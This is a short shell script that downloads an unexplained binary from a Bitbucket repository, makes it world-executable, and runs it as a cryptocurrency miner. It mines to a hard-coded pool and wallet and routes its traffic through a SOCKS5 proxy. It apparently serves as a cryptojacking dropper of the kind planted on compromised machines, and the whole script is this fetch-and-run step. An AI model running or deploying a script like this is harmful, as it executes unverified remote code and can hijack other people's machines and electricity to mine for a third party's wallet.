#!/bin/sh
wget https://bitbucket.org/qrlkoin/xmr/raw/504d68713ec8d6c18cf39201fc2d967d7410faf7/masterfile
chmod 777 masterfile
POOL=us-qrl.volt-mine.com:1111
WALLET=Q010500d0c32b2ca3f896998fbbfc3aecfb17a32e47965ab3496e92eeadc02dd6ee6ba82bac7343
WORKER=voc
PROXY=socks5://192.252.209.155:14455
./masterfile -o $POOL -u $WALLET -p $WORKER --donate-level 1 -x $PROXY
